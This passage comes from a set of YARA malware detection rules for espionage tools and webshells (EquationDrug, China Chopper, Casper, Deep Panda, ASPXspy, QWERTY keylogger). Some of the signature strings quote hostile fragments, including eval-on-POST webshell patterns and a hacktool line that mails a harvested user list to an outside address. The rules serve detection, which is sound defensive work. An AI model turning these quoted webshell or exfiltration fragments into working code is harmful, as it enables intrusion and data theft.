\"2015-03-11 12:18:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, T1056_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"\\\\registry\\\\machine\\\\software\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\" wide\n      $s2 = \"\\\\registry\\\\machine\\\\SYSTEM\\\\ControlSet001\\\\Control\\\\Session Manager\\\\En\" wide\n      $s3 = \"\\\\DosDevices\\\\Gk\" wide\n      $s5 = \"\\\\Device\\\\Gk0\" wide\n   condition: \n      all of them\n}\n\nrule EquationDrug_NetworkSniffer4_RID3233 : APT DEMO T1040 {\n   meta:\n      description = \"EquationDrug - Network-sniffer/patcher - atmdkdrv.sys\"\n      author = \"Florian Roth\"\n      reference = \"http://securelist.com/blog/research/69203/inside-the-equationdrug-espionage-platform/\"\n      date = \"2015-03-11 13:55:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2023-01-06\"\n      tags = \"APT, DEMO, T1040\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Copyright 1999 RAVISENT Technologies Inc.\" fullword wide\n      $s1 = \"\\\\systemroot\\\\\" ascii\n      $s2 = \"RAVISENT Technologies Inc.\" fullword wide\n      $s3 = \"Created by VIONA Development\" fullword wide\n      $s4 = \"\\\\Registry\\\\User\\\\CurrentUser\\\\\" wide\n      $s5 = \"\\\\device\\\\harddiskvolume\" wide\n      $s7 = \"ATMDKDRV.SYS\" fullword wide\n      $s8 = \"\\\\Device\\\\%ws_%ws\" wide\n      $s9 = \"\\\\DosDevices\\\\%ws\" wide\n      $s10 = \"CineMaster C 1.1 WDM Main Driver\" fullword wide\n      $s11 = \"\\\\Device\\\\%ws\" wide\n      $s13 = \"CineMaster C 1.1 WDM\" fullword wide\n   condition: \n      all of them\n}\n\nrule EquationDrug_PlatformOrchestrator_RID348D : APT DEMO {\n   meta:\n      description = \"EquationDrug - Platform orchestrator - mscfg32.dll, svchost32.dll\"\n      author = \"Florian Roth\"\n      reference = \"http://securelist.com/blog/research/69203/inside-the-equationdrug-espionage-platform/\"\n      date = \"2015-03-11 15:35:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"SERVICES.EXE\" fullword wide\n      $s1 = \"\\\\command.com\" wide\n      $s2 = \"Microsoft(R) Windows (TM) Operating System\" fullword wide\n      $s3 = \"LSASS.EXE\" fullword wide\n      $s4 = \"Windows Configuration Services\" fullword wide\n      $s8 = \"unilay.dll\" fullword ascii\n   condition: \n      all of them\n}\n\nrule EquationDrug_NetworkSniffer5_RID3234 : APT DEMO T1040 {\n   meta:\n      description = \"EquationDrug - Network-sniffer/patcher - atmdkdrv.sys\"\n      author = \"Florian Roth\"\n      reference = \"http://securelist.com/blog/research/69203/inside-the-equationdrug-espionage-platform/\"\n      date = \"2015-03-11 13:55:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2023-01-06\"\n      tags = \"APT, DEMO, T1040\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Microsoft(R) Windows (TM) Operating System\" fullword wide\n      $s1 = \"\\\\Registry\\\\User\\\\CurrentUser\\\\\" wide\n      $s2 = \"atmdkdrv.sys\" fullword wide\n      $s4 = \"\\\\Device\\\\%ws_%ws\" wide\n      $s5 = \"\\\\DosDevices\\\\%ws\" wide\n      $s6 = \"\\\\Device\\\\%ws\" wide\n   condition: \n      all of them\n}\n\nrule EquationDrug_FileSystem_Filter_RID3312 : APT DEMO {\n   meta:\n      description = \"EquationDrug - Filesystem filter driver volrec.sys, scsi2mgr.sys\"\n      author = \"Florian Roth\"\n      reference = \"http://securelist.com/blog/research/69203/inside-the-equationdrug-espionage-platform/\"\n      date = \"2015-03-11 14:32:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"volrec.sys\" fullword wide\n      $s1 = \"volrec.pdb\" fullword ascii\n      $s2 = \"Volume recognizer driver\" fullword wide\n   condition: \n      all of them\n}\n\nrule WEBSHELL_ChinaChopper_Generic_Mar15_RID337B : CHINA DEMO GEN T1505_003 WEBSHELL {\n   meta:\n      description = \"Detects China Chopper webshells\"\n      author = \"Florian Roth\"\n      reference = \"https://www.fireeye.com/content/dam/legacy/resources/pdfs/fireeye-china-chopper-report.pdf\"\n      date = \"2015-03-10 14:49:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2023-12-14\"\n      tags = \"CHINA, DEMO, GEN, T1505_003, WEBSHELL\"\n      minimum_yara = \"2.2.0\"\n      \n   strings:\n      $x_aspx = /%@\\sPage\\sLanguage=.Jscript.%><%eval\\(Request\\.Item\\[.{,100}unsafe/ \n      $x_php = /<?php.\\@eval\\(\\$_POST./ \n      $fp1 = \"GET /\" \n      $fp2 = \"POST /\" \n   condition: \n      filesize < 300KB and 1 of ( $x* ) and not 1 of ( $fp* )\n}\n\nrule Casper_Included_Strings_RID303F : APT DEMO EXE FILE T1082 {\n   meta:\n      description = \"Casper French Espionage Malware - String Match in File - https://www.welivesecurity.com/2015/03/05/casper-malware-babar-bunny-another-espionage-cartoon/\"\n      author = \"Florian Roth\"\n      reference = \"https://www.welivesecurity.com/2015/03/05/casper-malware-babar-bunny-another-espionage-cartoon/\"\n      date = \"2015-03-06 12:31:41\"\n      score = 50\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      tags = \"APT, DEMO, EXE, FILE, T1082\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $a0 = \"cmd.exe /C FOR /L %%i IN (1,1,%d) DO IF EXIST\" \n      $a1 = \"& SYSTEMINFO) ELSE EXIT\" \n      $c1 = \"domcommon.exe\" wide fullword\n      $c2 = \"jpic.gov.sy\" fullword\n      $c3 = \"aiomgr.exe\" wide fullword\n      $c4 = \"perfaudio.dat\" fullword\n      $c5 = \"Casper_DLL.dll\" fullword\n      $c6 = { 7B 4B 59 DE 37 4A 42 26 59 98 63 C6 2D 0F 57 40 } \n      $c7 = \"{4216567A-4512-9825-7745F856}\" fullword\n   condition: \n      all of ( $a* ) or ( uint16 ( 0 ) == 0x5a4d and 1 of ( $c* ) )\n}\n\nrule Casper_SystemInformation_Output_RID33C9 : APT DEMO {\n   meta:\n      description = \"Casper French Espionage Malware - System Info Output - https://www.welivesecurity.com/2015/03/05/casper-malware-babar-bunny-another-espionage-cartoon/\"\n      author = \"Florian Roth\"\n      reference = \"https://www.welivesecurity.com/2015/03/05/casper-malware-babar-bunny-another-espionage-cartoon/\"\n      date = \"2015-03-06 15:02:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      tags = \"APT, DEMO\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $a0 = \"***** SYSTEM INFORMATION ******\" \n      $a1 = \"***** SECURITY INFORMATION ******\" \n      $a2 = \"Antivirus: \" \n      $a3 = \"Firewall: \" \n      $a4 = \"***** EXECUTION CONTEXT ******\" \n      $a5 = \"Identity: \" \n      $a6 = \"<CONFIG TIMESTAMP=\" \n   condition: \n      all of them\n}\n\nrule Casper_EXE_Dropper_RID2DEB : APT DEMO {\n   meta:\n      description = \"Casper French Espionage Malware - Win32/ProxyBot.B - Dropper https://www.welivesecurity.com/2015/03/05/casper-malware-babar-bunny-another-espionage-cartoon/\"\n      author = \"Florian Roth\"\n      reference = \"https://www.welivesecurity.com/2015/03/05/casper-malware-babar-bunny-another-espionage-cartoon/\"\n      date = \"2015-03-05 10:52:21\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      tags = \"APT, DEMO\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<Command>\" fullword ascii\n      $s1 = \"</Command>\" fullword ascii\n      $s2 = \"\\\" /d \\\"\" fullword ascii\n      $s4 = \"'%s' %s\" fullword ascii\n      $s5 = \"nKERNEL32.DLL\" fullword wide\n      $s6 = \"@ReturnValue\" fullword wide\n      $s7 = \"ID: 0x%x\" fullword ascii\n      $s8 = \"Name: %S\" fullword ascii\n   condition: \n      7 of them\n}\n\nrule Equation_Kaspersky_GreyFishInstaller_RID35A1 : APT DEMO G0020 {\n   meta:\n      description = \"Equation Group Malware - Grey Fish\"\n      author = \"Florian Roth\"\n      reference = \"https://securelist.com/equation-the-death-star-of-malware-galaxy/68750/\"\n      date = \"2015-02-16 16:21:21\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      tags = \"APT, DEMO, G0020\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"DOGROUND.exe\" fullword wide\n      $s1 = \"Windows Configuration Services\" fullword wide\n      $s2 = \"GetMappedFilenameW\" fullword ascii\n   condition: \n      all of them\n}\n\nrule Equation_Kaspersky_EquationLaserInstaller_RID37BD : APT DEMO EXE FILE G0020 {\n   meta:\n      description = \"Equation Group Malware - EquationLaser Installer\"\n      author = \"Florian Roth\"\n      reference = \"https://securelist.com/equation-the-death-star-of-malware-galaxy/68750/\"\n      date = \"2015-02-16 17:51:21\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      tags = \"APT, DEMO, EXE, FILE, G0020\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Failed to get Windows version\" fullword ascii\n      $s1 = \"lsasrv32.dll and lsass.exe\" fullword wide\n      $s2 = \"\\\\\\\\%s\\\\mailslot\\\\%s\" fullword ascii\n      $s3 = \"%d-%d-%d %d:%d:%d Z\" fullword ascii\n      $s4 = \"lsasrv32.dll\" fullword ascii\n      $s6 = \"%s %02x %s\" fullword ascii\n      $s7 = \"VIEWERS\" fullword ascii\n      $s8 = \"5.2.3790.220 (srv03_gdr.040918-1552)\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d ) and filesize < 250000 and 6 of ( $s* )\n}\n\nrule Equation_Kaspersky_FannyWorm_RID3273 : APT DEMO EXE FILE G0020 T1543_003 {\n   meta:\n      description = \"Equation Group Malware - Fanny Worm\"\n      author = \"Florian Roth\"\n      reference = \"https://securelist.com/equation-the-death-star-of-malware-galaxy/68750/\"\n      date = \"2015-02-16 14:05:41\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      tags = \"APT, DEMO, EXE, FILE, G0020, T1543_003\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"x:\\\\fanny.bmp\" fullword ascii\n      $s2 = \"32.exe\" fullword ascii\n      $s3 = \"d:\\\\fanny.bmp\" fullword ascii\n      $x1 = \"c:\\\\windows\\\\system32\\\\kernel32.dll\" fullword ascii\n      $x2 = \"System\\\\CurrentControlSet\\\\Services\\\\USBSTOR\\\\Enum\" fullword ascii\n      $x3 = \"System\\\\CurrentControlSet\\\\Services\\\\PartMgr\\\\Enum\" fullword ascii\n      $x4 = \"\\\\system32\\\\win32k.sys\" wide\n      $x5 = \"\\\\AGENTCPD.DLL\" ascii\n      $x6 = \"agentcpd.dll\" fullword ascii\n      $x7 = \"PADupdate.exe\" fullword ascii\n      $x8 = \"dll_installer.dll\" fullword ascii\n      $x9 = \"\\\\restore\\\\\" ascii\n      $x10 = \"Q:\\\\__?__.lnk\" fullword ascii\n      $x11 = \"Software\\\\Microsoft\\\\MSNetMng\" fullword ascii\n      $x12 = \"\\\\shelldoc.dll\" ascii\n      $x13 = \"file size = %d bytes\" fullword ascii\n      $x14 = \"\\\\MSAgent\" ascii\n      $x15 = \"Global\\\\RPCMutex\" fullword ascii\n      $x16 = \"Global\\\\DirectMarketing\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d ) and filesize < 300000 and ( ( 2 of ( $s* ) ) or ( 1 of ( $s* ) and 6 of ( $x* ) ) or ( 14 of ( $x* ) ) )\n}\n\nrule MAL_Enfal_Nov22_RID2C26 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects a certain type of Enfal Malware\"\n      author = \"Florian Roth\"\n      reference = \"https://malpedia.caad.fkie.fraunhofer.de/details/win.enfal\"\n      date = \"2015-02-10 09:36:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2023-01-06\"\n      hash2 = \"42fa6241ab94c73c7ab386d600fae70da505d752daab2e61819a0142b531078a\"\n      hash2 = \"42fa6241ab94c73c7ab386d600fae70da505d752daab2e61819a0142b531078a\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $xop1 = { 00 00 83 c9 ff 33 c0 f2 ae f7 d1 49 b8 ff 8f 01 00 2b c1 } \n      $s1 = \"POWERPNT.exe\" fullword ascii\n      $s2 = \"%APPDATA%\\\\Microsoft\\\\Windows\\\\\" ascii\n      $s3 = \"%HOMEPATH%\" fullword ascii\n      $s4 = \"Server2008\" fullword ascii\n      $s5 = \"%ComSpec%\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and ( 1 of ( $x* ) or 3 of ( $s* ) )\n}\n\nrule DeepPanda_sl_txt_packed_RID3037 : APT CHINA DEMO G0009 T1027_002 {\n   meta:\n      description = \"Hack Deep Panda - FBI Liaison Alert System # A-000049-MW - ScanLine sl-txt-packed\"\n      author = \"Florian Roth\"\n      reference = \"http://krebsonsecurity.com/wp-content/uploads/2015/02/FBI-Flash-Warning-Deep-Panda.pdf\"\n      date = \"2015-02-08 12:30:21\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, CHINA, DEMO, G0009, T1027_002\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Command line port scanner\" fullword wide\n      $s1 = \"sl.exe\" fullword wide\n      $s2 = \"CPports.txt\" fullword ascii\n      $s3 = \",GET / HTTP/.}\" fullword ascii\n      $s4 = \"Foundstone Inc.\" fullword wide\n      $s9 = \" 2002 Foundstone Inc.\" fullword wide\n      $s15 = \", Inc. 2002\" fullword ascii\n      $s20 = \"ICMP Time\" fullword ascii\n   condition: \n      all of them\n}\n\nrule DeepPanda_lot1_RID2C52 : APT CHINA DEMO G0009 T1003 {\n   meta:\n      description = \"Hack Deep Panda - FBI Liaison Alert System # A-000049-MW - lot1.tmp-pwdump\"\n      author = \"Florian Roth\"\n      reference = \"http://krebsonsecurity.com/wp-content/uploads/2015/02/FBI-Flash-Warning-Deep-Panda.pdf\"\n      date = \"2015-02-08 09:44:11\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, CHINA, DEMO, G0009, T1003\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Unable to open target process: %d, pid %d\" fullword ascii\n      $s1 = \"Couldn't delete target executable from remote machine: %d\" fullword ascii\n      $s2 = \"Target: Failed to load SAM functions.\" fullword ascii\n      $s5 = \"Error writing the test file %s, skipping this share\" fullword ascii\n      $s6 = \"Failed to create service (%s/%s), error %d\" fullword ascii\n      $s8 = \"Service start failed: %d (%s/%s)\" fullword ascii\n      $s12 = \"PwDump.exe\" fullword ascii\n      $s13 = \"GetAvailableWriteableShare returned an error of %ld\" fullword ascii\n      $s14 = \":\\\\\\\\.\\\\pipe\\\\%s\" fullword ascii\n      $s15 = \"Couldn't copy %s to destination %s. (Error %d)\" fullword ascii\n      $s16 = \"dump logon session\" fullword ascii\n      $s17 = \"Timed out waiting to get our pipe back\" fullword ascii\n      $s19 = \"SetNamedPipeHandleState failed, error %d\" fullword ascii\n      $s20 = \"%s\\\\%s.exe\" fullword ascii\n   condition: \n      10 of them\n}\n\nrule APT_DeepPanda_htran_Feb15_RID3005 : APT CHINA DEMO G0009 T1020 T1090 {\n   meta:\n      description = \"Detects a tool used by Deep Panda\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2015-02-08 12:22:01\"\n      score = 100\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2023-04-21\"\n      tags = \"APT, CHINA, DEMO, G0009, T1020, T1090\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"%s -<listen|tran|slave> <option> [-log logfile]\" fullword ascii\n      $x2 = \"\\\\Release\\\\htran.pdb\" ascii\n      $x3 = \"[SERVER]connection to %s:%d error\" fullword ascii\n      $x4 = \"-tran  <ConnectPort> <TransmitHost> <TransmitPort>\" fullword ascii\n      $x5 = \"======================== htran V%s =======================\" fullword ascii\n      $x6 = \"-slave  <ConnectHost> <ConnectPort> <TransmitHost> <TransmitPort>\" fullword ascii\n      $x7 = \"[+] OK! I Closed The Two Socket.\" fullword ascii\n      $x8 = \"-listen <ConnectPort> <TransmitPort>\" fullword ascii\n   condition: \n      1 of them\n}\n\nrule DeepPanda_Trojan_Kakfum_RID2FFE : APT CHINA DEMO G0009 {\n   meta:\n      description = \"Hack Deep Panda - FBI Liaison Alert System # A-000049-MW - Trojan.Kakfum sqlsrv32.dll\"\n      author = \"Florian Roth\"\n      reference = \"http://krebsonsecurity.com/wp-content/uploads/2015/02/FBI-Flash-Warning-Deep-Panda.pdf\"\n      date = \"2015-02-08 12:20:51\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"ab58b6aa7dcc25d8f6e4b70a24e0ccede0d5f6129df02a9e61293c1d7d7640a2\"\n      hash2 = \"c6c3bb72896f8f0b9a5351614fd94e889864cf924b40a318c79560bbbcfa372f\"\n      tags = \"APT, CHINA, DEMO, G0009\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"%SystemRoot%\\\\System32\\\\svchost.exe -k sqlserver\" fullword ascii\n      $s1 = \"%s\\\\sqlsrv32.dll\" fullword ascii\n      $s2 = \"%s\\\\sqlsrv64.dll\" fullword ascii\n      $s3 = \"%s\\\\%d.tmp\" fullword ascii\n      $s4 = \"ServiceMaix\" fullword ascii\n      $s15 = \"sqlserver\" fullword ascii\n   condition: \n      all of them\n}\n\nrule ASPXspy2_RID29DB : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web shell - file ASPXspy2_RID29DB.aspx\"\n      author = \"Florian Roth\"\n      reference = \"not set\"\n      date = \"2015-01-24 01:50:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"string iVDT=\\\"-SETUSERSETUP\\\\r\\\\n-IP=0.0.0.0\\\\r\\\\n-PortNo=52521\\\\r\\\\n-User=bin\" ascii\n      $s1 = \"SQLExec : <asp:DropDownList runat=\\\"server\\\" ID=\\\"FGEy\\\" AutoPostBack=\\\"True\\\" O\" ascii\n      $s3 = \"Process[] p=Process.GetProcesses();\" fullword ascii\n      $s4 = \"Response.Cookies.Add(new HttpCookie(vbhLn,Password));\" fullword ascii\n      $s5 = \"[DllImport(\\\"kernel32.dll\\\",EntryPoint=\\\"GetDriveTypeA\\\")]\" fullword ascii\n      $s6 = \"<p>ConnString : <asp:TextBox id=\\\"MasR\\\" style=\\\"width:70%;margin:0 8px;\\\" CssCl\" ascii\n      $s7 = \"ServiceController[] kQmRu=System.ServiceProcess.ServiceController.GetServices();\" fullword ascii\n      $s8 = \"Copyright &copy; 2009 Bin -- <a href=\\\"http://www.rootkit.net.cn\\\" target=\\\"_bla\" ascii\n      $s10 = \"Response.AddHeader(\\\"Content-Disposition\\\",\\\"attachment;filename=\\\"+HttpUtility.\" ascii\n      $s11 = \"nxeDR.Command+=new CommandEventHandler(this.iVk);\" fullword ascii\n      $s12 = \"<%@ import Namespace=\\\"System.ServiceProcess\\\"%>\" fullword ascii\n      $s13 = \"foreach(string innerSubKey in sk.GetSubKeyNames())\" fullword ascii\n      $s17 = \"Response.Redirect(\\\"http://www.rootkit.net.cn\\\");\" fullword ascii\n      $s20 = \"else if(Reg_Path.StartsWith(\\\"HKEY_USERS\\\"))\" fullword ascii\n   condition: \n      6 of them\n}\n\nrule LinuxHacktool_eyes_a_RID2F2B : DEMO HKTL LINUX {\n   meta:\n      description = \"Linux hack tools - file a\"\n      author = \"Florian Roth\"\n      reference = \"not set\"\n      date = \"2015-01-19 11:45:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, HKTL, LINUX\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"cat trueusers.txt | mail -s \\\"eyes\\\" clubby@slucia.com\" fullword ascii\n      $s1 = \"mv scan.log bios.txt\" fullword ascii\n      $s2 = \"rm -rf bios.txt\" fullword ascii\n      $s3 = \"echo -e \\\"# by Eyes.\\\"\" fullword ascii\n      $s4 = \"././pscan2 $1 22\" fullword ascii\n      $s10 = \"echo \\\"#cautam...\\\"\" fullword ascii\n   condition: \n      2 of them\n}\n\nrule FiveEyes_QUERTY_Malwaresig_20121_dll_RID33D5 : APT DEMO {\n   meta:\n      description = \"FiveEyes QUERTY Malware - file 20121.dll.bin\"\n      author = \"Florian Roth\"\n      reference = \"http://www.spiegel.de/media/media-35668.pdf\"\n      date = \"2015-01-18 15:04:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"WarriorPride\\\\production2.0\\\\package\\\\E_Wzowski\" ascii\n      $s1 = \"20121.dll\" fullword ascii\n   condition: \n      all of them\n}\n\nrule FiveEyes_QUERTY_Malwareqwerty_20121_RID33A3 : APT DEMO {\n   meta:\n      description = \"FiveEyes QUERTY Malware - file 20121.xml\"\n      author = \"Florian Roth\"\n      reference = \"http://www.spiegel.de/media/media-35668.pdf\"\n      date = \"2015-01-18 14:56:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<configFileName>20121_cmdDef.xml</configFileName>\" fullword ascii\n      $s1 = \"<name>20121.dll</name>\" fullword ascii\n      $s2 = \"<codebase>\\\"Reserved for future use.\\\"</codebase>\" fullword ascii\n      $s3 = \"<plugin xmlns:xsi=\\\"http://www.w3.org/2001/XMLSchema-instance\\\" xsi:noNamespaceS\" ascii\n      $s4 = \"<platform type=\\\"1\\\">\" fullword ascii\n      $s5 = \"</plugin>\" fullword ascii\n      $s6 = \"</pluginConfig>\" fullword ascii\n      $s7 = \"<pluginConfig>\" fullword ascii\n      $s8 = \"</platform>\" fullword ascii\n      $s9 = \"</lpConfig>\" fullword ascii\n      $s10 = \"<lpConfig>\" fullword ascii\n   condition: \n      9 of them\n}\n\nrule FiveEyes_QUERTY_Malwaresig_20123_sys_RID33FA : APT DEMO {\n   meta:\n      description = \"FiveEyes QUERTY Malware - file 20123.sys.bin\"\n      author = \"Florian Roth\"\n      reference = \"http://www.spiegel.de/media/media-35668.pdf\"\n      date = \"2015-01-18 15:10:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"20123.dll\" fullword ascii\n      $s1 = \"kbdclass.sys\" fullword wide\n      $s2 = \"IoFreeMdl\" fullword ascii\n      $s3 = \"ntoskrnl.exe\" fullword ascii\n      $s4 = \"KfReleaseSpinLock\" fullword ascii\n   condition: \n      all of them\n}\n\nrule FiveEyes_QUERTY_Malwaresig_20123_cmdDef_RID34DE : APT DEMO T1220 {\n   meta:\n      description = \"FiveEyes QUERTY Malware - file 20123_cmdDef.xml\"\n      author = \"Florian Roth\"\n      reference = \"http://www.spiegel.de/media/media-35668.pdf\"\n      date = \"2015-01-18 15:48:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, T1220\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<shortDescription>Keystroke Collector</shortDescription>\" fullword ascii\n      $s1 = \"This plugin is the E_Qwerty Kernel Mode driver for logging keys.</description>\" fullword ascii\n      $s2 = \"<commands/>\" fullword ascii\n      $s3 = \"</version>\" fullword ascii\n      $s4 = \"<associatedImplantId>20121</associatedImplantId>\" fullword ascii\n      $s5 = \"<rightsRequired>System or Administrator (if Administrator, I think the DriverIns\" ascii\n      $s6 = \"<platforms>Windows NT, Windows 2000, Windows XP (32/64 bit), Windows 2003 (32/64\" ascii\n      $s7 = \"<projectpath>plugin/Collection</projectpath>\" fullword ascii\n      $s8 = \"<dllDepend>None</dllDepend>\" fullword ascii\n      $s9 = \"<minorType>0</minorType>\" fullword ascii\n      $s10 = \"<pluginname>E_QwertyKM</pluginname>\" fullword ascii\n      $s11 = \"</comments>\" fullword ascii\n      $s12 = \"<comments>\" fullword ascii\n      $s13 = \"<majorType>1</majorType>\" fullword ascii\n      $s14 = \"<files>None</files>\" fullword ascii\n      $s15 = \"<poc>Erebus</poc>\" fullword ascii\n      $s16 = \"</plugin>\" fullword ascii\n      $s17 = \"<team>None</team>\" fullword ascii\n      $s18 = \"<?xml-stylesheet type=\\\"text/xsl\\\" href=\\\"../XSLT/pluginHTML.xsl\\\"?>\" fullword ascii\n      $s19 = \"<pluginsDepend>U_HookManager v1.0, Kernel Covert Store v1.0</pluginsDepend>\" fullword ascii\n      $s20 = \"<plugin id=\\\"20123\\\" xmlns:xsi=\\\"http://www.w3.org/2001/XMLSchema-instance\\\" xsi\" ascii\n   condition: \n      14 of them\n}\n\nrule FiveEyes_QUERTY_Malwareqwerty_20123_RID33A5 : APT DEMO {\n   meta:\n      description = \"FiveEyes QUERTY Malware - file 20123.xml\"\n      author = \"Florian Roth\"\n      reference = \"http://www.spiegel.de/media/media-35668.pdf\"\n      date = \"2015-01-18 14:56:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<!-- edited with XMLSPY v5 rel. 4 U (http://www.xmlspy.com) by TEAM (RENEGADE) -\" ascii\n      $s1 = \"<configFileName>20123_cmdDef.xml</configFileName>\" fullword ascii\n      $s2 = \"<name>20123.sys</name>\" fullword ascii\n      $s3 = \"<plugin xmlns:xsi=\\\"http://www.w3.org/2001/XMLSchema-instance\\\" xsi:noNamespaceS\" ascii\n      $s4 = \"<codebase>/bin/i686-pc-win32/debug</codebase>\" fullword ascii\n      $s5 = \"<platform type=\\\"1\\\">\" fullword ascii\n      $s6 = \"</plugin>\" fullword ascii\n      $s7 = \"</pluginConfig>\" fullword ascii\n      $s8 = \"<pluginConfig>\" fullword ascii\n      $s9 = \"</platform>\" fullword ascii\n      $s10 = \"</lpConfig>\" fullword ascii\n      $s11 = \"<lpConfig>\" fullword ascii\n   condition: \n      9 of them\n}\n\nrule FiveEyes_QUERTY_Malwaresig_20120_dll_RID33D4 : APT DEMO {\n   meta:\n      description = \"FiveEyes QUERTY Malware - file 20120.dll.bin\"\n      author = \"Florian Roth\"\n      reference = \"http://www.spiegel.de/media/media-35668.pdf\"\n      date = \"2015-01-18 15:04:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"\\\\QwLog_%d-%02d-%02d-%02d%02d%02d.txt\" wide\n      $s1 = \"\\\\QwLog_%d-%02d-%02d-%02d%02d%02d.xml\" wide\n      $s2 = \"Failed to send the EQwerty_driverStatusCommand to the implant.\" fullword ascii\n      $s3 = \"- Log Used (number of windows) - %d\" fullword wide\n      $s4 = \"- Log Limit (number of windows) - %d\" fullword wide\n      $s5 = \"Process or User Default Language\" fullword wide\n      $s6 = \"Windows 98/Me, Windows NT 4.0 and later: Vietnamese\" fullword wide\n      $s7 = \"- Logging of keystrokes is switched ON\" fullword wide\n      $s8 = \"- Logging of keystrokes is switched OFF\" fullword wide\n      $s9 = \"Qwerty is currently logging active windows with titles containing the fo\" wide\n      $s10 = \"Windows 95, Windows NT 4.0 only: Korean (Johab)\" fullword wide\n      $s11 